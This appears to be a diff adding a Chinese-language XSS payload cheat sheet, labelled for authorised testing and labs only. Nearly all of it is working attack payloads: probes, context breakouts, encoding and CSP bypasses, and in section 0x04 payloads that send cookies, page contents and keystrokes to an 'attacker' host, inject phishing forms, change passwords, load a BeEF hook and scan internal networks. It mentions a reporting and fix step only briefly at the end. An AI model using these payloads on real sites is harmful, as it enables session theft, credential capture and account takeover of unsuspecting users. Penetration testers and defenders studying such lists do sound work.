@@ -1,0 +1,98 @@
+==========================================================================
+ XSS 跨站脚本 Payload 速查（含过滤绕过 / 利用 / 接收平台）
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 探测与最小验证】
+ <script>alert(1)</script>
+ <img src=x onerror=alert(1)>
+ <svg onload=alert(1)>
+ <details open ontoggle=alert(1)>
+ <input autofocus onfocus=alert(1)>
+ <select autofocus onfocus=alert(1)>
+ <textarea autofocus onfocus=alert(1)>
+ <body onload=alert(1)>
+ <iframe src=javascript:alert(1)>
+ <a href=javascript:alert(1)>x</a>
+ 无回显探测唯一标记: alert(document.domain) / alert('XSS9f3k2')
+
+【0x02 注入位置与闭合】
+ HTML 标签之间:  <svg onload=...>
+ 属性内:  "><script>alert(1)</script>
+         " onmouseover=alert(1) x="   /   ' onfocus=alert(1) autofocus x='
+ 事件无引号:  =alert(1)
+ JS 代码块内:
+    ';alert(1)//    ";alert(1)//    </script><script>alert(1)</script>
+    -alert(1)-      /alert(1)/      ${alert(1)}   (模板字符串)
+ JSON/script JSON: </script><script>alert(1)</script>
+ URL/href: javascript:alert(1)   data:text/html,<script>alert(1)</script>
+ DOM 型: #<img src=x onerror=alert(1)>、postMessage、innerHTML 点
+
+【0x03 过滤绕过】
+ 大小写: <ScRiPt>alert(1)</ScRiPt>  <sCrIpT src=//x>
+ 无括号: onerror=alert`1`   onload=alert\`1\`
+ 无空格: <img/src=x/onerror=alert(1)>   <svg/onload=alert(1)>
+ 关键字被替换（只替一次）: <scr<script>ipt>、<<script>script>
+ 双写: <img/src/onerror=onerror=...> 不适用，用 <scrscriptipt>
+ 编码:
+   HTML 实体:  <img src=x onerror="&#97;lert(1)">
+   十进制实体: &#97;&#108;&#101;&#114;&#116;&#40;1&#41;
+   十六进制:   &#x61;&#x6c;&#x65;&#x72;&#x74;(1)
+   JS unicode: <script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
+   URL 编码:   %3Csvg%20onload%3Dalert(1)%3E（看后端是否解码）
+   二次编码:   %253C -> %3C -> <
+   base64:     <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+   String.fromCharCode:
+     <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+ 引号被转义(\'): 闭合反斜杠 \';alert(1)//；或不用引号 onerror=alert(1)
+ 尖括号被过滤:  利用模板/事件: " onmouseover=alert(document.cookie) //
+ 仅过滤 alert:  confirm(1) prompt(1) top.alert(1) window['ale'+'rt'](1)
+               eval(atob('YWxlcnQoMSk='))  Function('ale'+'rt(1)')()
+ CSP 绕过:
+   同源 JSONP: <script src="/path/jsonp?callback=alert(document.domain)//"></script>
+   找白名单 CDN:  cdn.jsdelivr.net 上的 AngularJS:
+     ng-app ng-csp: {{$eval.constructor('alert(1)')()}}
+   检查 CSP: 响应头 Content-Security-Policy；用 https://csp-evaluator.withgoogle.com
+   常见可利用库: AngularJS 1.6 前 {{constructor.constructor...}}、
+   jQuery $.get 白名单域 JSONP、上传同域 HTML/SVG
+
+【0x04 实战利用（打 Cookie / 会话）】
+ 外带 Cookie:
+   <script>new Image().src='http://attacker:8888/?c='+encodeURIComponent(document.cookie)</script>
+   <img src=x onerror="fetch('http://attacker:8888/?'+document.cookie)">
+ 外带页面内容/Token:
+   <script>fetch('http://attacker/?'+btoa(document.body.innerHTML))</script>
+   <script>fetch('/profile').then(r=>r.text()).then(t=>fetch('http://attacker/?'+btoa(t)))</script>
+ 劫持操作（CSRF 型 XSS）:
+   fetch('/changePwd',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+   body:'newpass=hacked'})
+ 键盘记录:
+   <script>document.onkeypress=e=>fetch('http://attacker/?k='+e.key)</script>
+ 钓鱼: document.body.innerHTML='<form action=http://attacker/login>账号<input name=u>...'
+ 内网扫描: 用 img/fetch 探测 192.168.x.x:port，结果外带
+ BeEF hook: <script src="http://attacker/hook.js"></script>
+ 接收平台: 自建 nc -lvnp 8888；XSS Platform；xss.sh；requestrepo.com；webhook.site
+
+【0x05 HttpOnly / SameSite 应对】
+ HttpOnly 拿不到 cookie: 改打 token（localStorage/sessionStorage）、
+ 直接以受害者身份发请求（同源 fetch 自动带 cookie）、读页面敏感数据外带
+ SameSite=Lax: 顶层 GET 跳转仍带 cookie，可构造 <a> 诱导点击/window.open
+ SameSite=Strict: XSS 内发同源请求不受影响，直接在页面里做操作
+
+【0x06 特殊上下文】
+ Markdown: [x](javascript:alert(1)) 、![x](x"onerror="alert(1))
+ 富文本/编辑器: 粘贴 SVG 文件、<iframe>、style expression(老IE)
+ 文件名/头像 alt: 文件名 "><img src=x onerror=alert(1)>.png
+ SVG 文件: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+ PDF: JavaScript in PDF: /JS (alert(1))
+ 邮件: <img src=x onerror=...>（多数 webmail 过滤，试 SVG/表单）
+ 小程序/webview: 一般禁 script，测 jockey bridge、postMessage 滥用
+ Flash(已淘汰): ExternalInterface / navigateToURL
+
+【0x07 测试流程建议】
+ 1) 先插唯一探针确定输出上下文（HTML/属性/JS/URL/DOM）
+ 2) 按上下文选闭合，再验证 alert(document.domain)
+ 3) 查过滤规则与 CSP，逐步绕过
+ 4) 换成外带 payload 验证数据可达
+ 5) 报告写清: 注入点 URL、参数、payload、危害截图、Cookie/身份级别、修复(转义+CSP+HttpOnly)
+==========================================================================
